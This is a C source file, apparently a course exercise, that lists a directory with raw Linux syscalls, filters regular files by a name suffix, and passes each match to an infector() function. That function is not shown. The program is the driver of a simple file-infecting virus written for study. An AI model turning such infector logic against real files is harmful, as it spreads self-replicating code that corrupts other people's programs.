#define _GNU_SOURCE

#define handle_error(msg) \
    do { system_call(1,0x55,0,0);} while (0)
        
#define O_RDONLY 0
#define O_DIRECTORY 00200000

struct linux_dirent
{
    unsigned long d_ino;
    unsigned long d_off;
    unsigned short d_reclen;
    char d_name[];
};

#define BUF_SIZE 8192
int compareString(char *first, char *second)
{
    while (*first != 0 && *second != 0)
    {
        if (*first != *second)
            return -1;
        second++;
        first++;
    }
    if (*first == *second)
        return 0;
    else
        return -1;
}
void writeDebug(char *input, int shouldWrite)
{
    if (shouldWrite < 0)
    {
        return;
    }
    while (*input != 0)
    {
       system_call(4,2, input, 1);
        input++;    
    }
}

void writeFile(struct linux_dirent * row, char *suffix,int shouldDebug)
{
        int nameLen =strlen(row->d_name);
        if (suffix ==0 || suffix[0] == row->d_name[nameLen-1])
        {
            writeDebug("\nid: ", shouldDebug);
            writeDebug(itoa(row->d_ino), shouldDebug);
            writeDebug("\nsize: ", shouldDebug);
            writeDebug(itoa(row->d_reclen), shouldDebug);
            writeDebug("\n", shouldDebug);
            system_call(4,2, row->d_name, nameLen);
            system_call(4,2, "\n", 1);
            infector(row->d_name);
        }
}


int main(int argc, char *argv[])
{
    int shouldDebug = -1;
    int fd, nread;
    char buf[BUF_SIZE];
    struct linux_dirent *d;
    int bpos;
    char *suffix = 0;
    char * dir = 0;
    int i=0;
    for (i = 0; i < argc; i++)
    {
        if (compareString(argv[i], "-s") == 0)
        {
            suffix = argv[i+1];
        }
        else if (compareString(argv[i], "-i") == 0)
        {
            dir = argv[i+1];
        }
         else if (compareString(argv[i], "-d") == 0)
        {
            shouldDebug = 0;
        }
    }
    fd = system_call(5, dir == 0 ? "." : dir, O_RDONLY | O_DIRECTORY);
    if (fd == -1)
        handle_error("open");
    while (1)
    {
        nread = system_call(141, fd, buf, BUF_SIZE);
        if (nread == -1)
            handle_error("getdents");

        if (nread == 0)
            break;

        for (bpos = 0; bpos < nread;)
        {
            d = (struct linux_dirent *)(buf + bpos);
            char d_type;
            d_type = *(buf + bpos + d->d_reclen - 1);
                if (d_type == 8)
            {
                writeFile(d, suffix,shouldDebug);   
            }
            bpos += d->d_reclen;
        }
    }
}
